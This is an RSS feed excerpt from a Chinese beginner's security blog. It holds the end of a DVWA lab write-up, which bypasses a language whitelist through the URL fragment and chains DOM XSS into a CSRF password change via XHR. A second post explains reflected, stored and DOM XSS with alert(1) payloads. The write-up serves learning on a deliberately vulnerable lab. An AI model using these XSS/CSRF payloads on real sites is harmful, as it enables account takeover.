&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="c1">// Is there any input?
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">array_key_exists&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s2">&amp;#34;default&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$_GET&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nx">is_null&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;default&amp;#39;&lt;/span> &lt;span class="p">])&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1"># White list the allowable languages
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;default&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="s2">&amp;#34;French&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="s2">&amp;#34;English&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="s2">&amp;#34;German&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="s2">&amp;#34;Spanish&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="c1"># ok
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">default&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="nx">header&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;location: ?default=English&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">exit&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>白名单？这我有点不懂了。想一想先。&lt;/p>
&lt;p>想 bypass 显然不能等进入 &lt;code>switch&lt;/code>，只能在 &lt;code>if&lt;/code> 这里就直接过，所以问题就是&lt;code>array_key_exists&lt;/code>和&lt;code>is_null&lt;/code>这两个函数能不能 bypass 。&lt;/p>
&lt;p>没什么用的分析略，行不通。&lt;/p>
&lt;p>不过还是有办法，可以用 URL 里的 Fragment。（url里的&lt;code>#fragment&lt;/code>部分）。因为JS代码里是这么写的：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kd">var&lt;/span> &lt;span class="nx">lang&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">location&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">href&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">substring&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">location&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">href&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">indexOf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;default=&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>直接从&lt;code>href&lt;/code>里取&lt;code>substring&lt;/code>，偏移值是&lt;code>href.indexOf&lt;/code>获得，并没有考虑是从 QueryString 还是 Fragment 取值。所以完全可以把原先的payload加上一个&lt;code>#&lt;/code>解决问题。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428145238725.png"
width="676"
height="169"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428145238725_huaa39aeb0cde7b5644c845b1eb10671f0_7523_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428145238725_huaa39aeb0cde7b5644c845b1eb10671f0_7523_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428145238725"
class="gallery-image"
data-flex-grow="400"
data-flex-basis="960px"
>&lt;/p>
&lt;p>好吧，我承认看了下帮助，差点钻了php的牛角尖，去硬找方法 bypass 服务端的检查。&lt;/p>
&lt;h3 id="csrf解题">CSRF：解题&lt;/h3>
&lt;p>主要是解决 Cookies 默认 &lt;code>samesite: lax&lt;/code> 导致的 xhr 行不通的问题。&lt;/p>
&lt;p>把 payload 改成下面这样。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">option&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">select&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">img&lt;/span> &lt;span class="na">src&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;&amp;#34;&lt;/span> &lt;span class="na">onerror&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;let xhr = new XMLHttpRequest(); xhr.open(&amp;#39;get&amp;#39;, &amp;#39;http://localhost:8080/vulnerabilities/csrf/?password_new=xss&amp;amp;password_conf=xss&amp;amp;Change=Change&amp;#39;); xhr.withCredentials=true; xhr.send();&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428150236560.png"
width="1412"
height="76"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428150236560_hub28227194eb20365c2c5c05d48f1819b_17488_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428150236560_hub28227194eb20365c2c5c05d48f1819b_17488_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428150236560"
class="gallery-image"
data-flex-grow="1857"
data-flex-basis="4458px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428150255678.png"
width="405"
height="86"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428150255678_hu78ed2e3ce39efde3832f99f036b3e25d_6191_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428150255678_hu78ed2e3ce39efde3832f99f036b3e25d_6191_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428150255678"
class="gallery-image"
data-flex-grow="470"
data-flex-basis="1130px"
>&lt;/p>
&lt;p>然后验证下修改的密码&lt;code>xss&lt;/code>是否有效。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428150319091.png"
width="219"
height="164"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428150319091_hu37c43fb2e344f0a81362d8beb3bde604_3637_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428150319091_hu37c43fb2e344f0a81362d8beb3bde604_3637_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428150319091"
class="gallery-image"
data-flex-grow="133"
data-flex-basis="320px"
>&lt;/p>
&lt;p>相应的，提高到 Medium 和 High 难度其实也没有难度了。&lt;/p>
&lt;p>Medium难度的 CSRF 只检查了 Host，XSS 方式发起的 CSRF 攻击无法通过检查同源和&lt;code>Host&lt;/code>来解决。但严格检查 &lt;code>Referer&lt;/code> 的话还是有可能发现的。&lt;/p>
&lt;p>High 难度的 CSRF 添加了 &lt;code>csrf_token&lt;/code>，但是 XSS 方式发起攻击完全可以 xhr 请求到表单页面的 HTML，也就可以拿到 token，&lt;code>csrf_token&lt;/code> 无法防御。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>这个 XSS 题花样还是有点少，我还是挺期待能把大佬玩出花的 XSS payload 都学一学在什么场景玩，什么原因研发出来的。&lt;/p>
&lt;p>将来有机会应该会找找有没有比较好玩的 XSS 靶场练练手。&lt;/p></description></item><item><title>安全入门系列-xss</title><link>https://nnnewb.github.io/blog/p/xss-day-1/</link><pubDate>Mon, 18 Apr 2022 10:11:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/xss-day-1/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>要是开发拿不到更高薪，继续撞天花板，就打算转安全了。考虑5年开发，以及不止5年的各种学习，想转到安全应该不是太难的事。&lt;/p>
&lt;p>且不说转不转行，先了解下安全这行总没错。不转行懂点安全也算优势。&lt;/p>
&lt;blockquote>
&lt;p>编辑于 2022年4月19日&lt;/p>
&lt;/blockquote>
&lt;p>考虑成体系学习，把标题改成了安全入门系列。差不多弄清楚 web 安全主流的攻防方向之后再整理个脑图什么的梳理下怎么深入。&lt;/p>
&lt;h2 id="xss">XSS&lt;/h2>
&lt;h3 id="原理">原理&lt;/h3>
&lt;p>XSS全称 Cross Site Scripting，X 就是 Cross（强行冷笑话）。本质是利用不正常的方式，在网页上插入一段可以执行的 JavaScript 代码，实现窃取 Cookie、冒充用户发送请求之类的操作。&lt;/p>
&lt;p>众所周知浏览器按 F12 在开发者工具里想怎么玩弄网页都行，XSS 听起来像是脱裤放屁。但开发者工具是有极限的，骗人打开开发者工具往里面贴自己看不懂的代码，和发个链接一打开就中招显然是两个难度的事情。&lt;/p>
&lt;h3 id="分类">分类&lt;/h3>
&lt;h4 id="反射型">反射型&lt;/h4>
&lt;p>反射型 XSS 利用服务器或前端把请求中的字段渲染成 HTML 的行为来向网页注入 js。比如这样一个页面：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="nx">你好，&lt;/span>&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">&amp;lt;/p&amp;gt;
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>页面元素的一部分未经过滤就直接渲染成了 HTML 的一部分，就会产生一个 XSS 漏洞，传递这样一个 &lt;code>name&lt;/code> ： &lt;code>&amp;lt;img src=1 onerror=alert(1)/&amp;gt;&lt;/code> 就能让网页按我们的想法弹窗了。&lt;/p>
&lt;p>之所以叫反射型，是因为注入的 JS 到了服务器又回到了前端，就像是镜子里反射出你自己的影子。&lt;/p>
&lt;h4 id="持久型">持久型&lt;/h4>
&lt;p>和反射型差不多，不同的是注入的 JS 被持久化到了服务端，比如上面的用户名注入点是从数据库提取的，那么把用户名改成 &lt;code>&amp;lt;img src=1 onerror=alert(1)/&amp;gt;&lt;/code>，每次访问这个页面都会触发脚本了，威胁比反射型 XSS 更大。&lt;/p>
&lt;h4 id="dom型">DOM型&lt;/h4>
&lt;p>DOM 型和上面其他 XSS 的主要区别在于不经过服务器，像是现在大前端常见的 SPA ，路由都在前端，后端只有 API 不负责渲染网页。如果前端应用里出现 &lt;code>elem.innerHTML=userinput&lt;/code>，&lt;code>userinput&lt;/code>没好好过滤的情况，就是个 DOM 型的 XSS 漏洞。&lt;/p>
&lt;h3 id="测试">测试&lt;/h3>
&lt;h4 id="代码审计">代码审计&lt;/h4>
&lt;p>目前对代码审计的理解就是 review 源码来尝试发现漏洞，大概只对开源代码或前端代码有用。没代码的话审计就有点逆向的意思了。XSS 漏洞可以从审计中发现，比如 &lt;a class="link" href="https://www.leavesongs.com/PENETRATION/a-tour-of-tui-editor-xss.html" target="_blank" rel="noopener"
>一次对 Tui Editor XSS 的挖掘与分析&lt;/a>。&lt;/p>
&lt;h4 id="手动测试">手动测试&lt;/h4>
&lt;p>手工测试就是在可能的 XSS 注入点提交诸如 &lt;code>&amp;lt;img/onerror=alert(1)&amp;gt;&lt;/code>一类的内容，观察提交的内容是怎么转义的，提交内容如何渲染，再尝试修改 payload 来绕过防护，直至成功或失败。&lt;/p>
&lt;h4 id="自动测试">自动测试&lt;/h4>
&lt;p>尚不清楚自动 XSS 测试的原理，工具有 &lt;a class="link" href="https://github.com/chaitin/xray" target="_blank" rel="noopener"
>XRay&lt;/a> 。个人猜测至少两条路子：&lt;/p>
&lt;ol>
&lt;li>对能访问源码的情况可以自动源码审计，找出危险的赋值或调用。&lt;/li>
&lt;li>不能访问源码的情况下：
&lt;ol>
&lt;li>尝试判断底层框架，使用已知漏洞的 exploit 测试&lt;/li>
&lt;li>根据一定的规则，在可能的表单提交点尝试一系列 payload&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;p>实际上我觉得更像是半自动的，比如不涉及源码的情况下至少应该需要配置下要尝试的注入点（以及如何检测注入是否成功的页面）和指定 payload 类型，不然注入点的表单都填不满。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>我倒是想再加个实战环节，但现在找个足够简单的 XSS 还挺难的。vulhub 有个 drupal 的 XSS 虽然能跑，但单纯跑一下 PoC 着实没什么乐趣可言。重复一次别人做过的分析倒是可以，但有点超出写这篇博客时的计划了，于是暂时不管，走马观花为主，先对整个安全体系建立概念再由点带面入门。&lt;/p></description></item></channel></rss>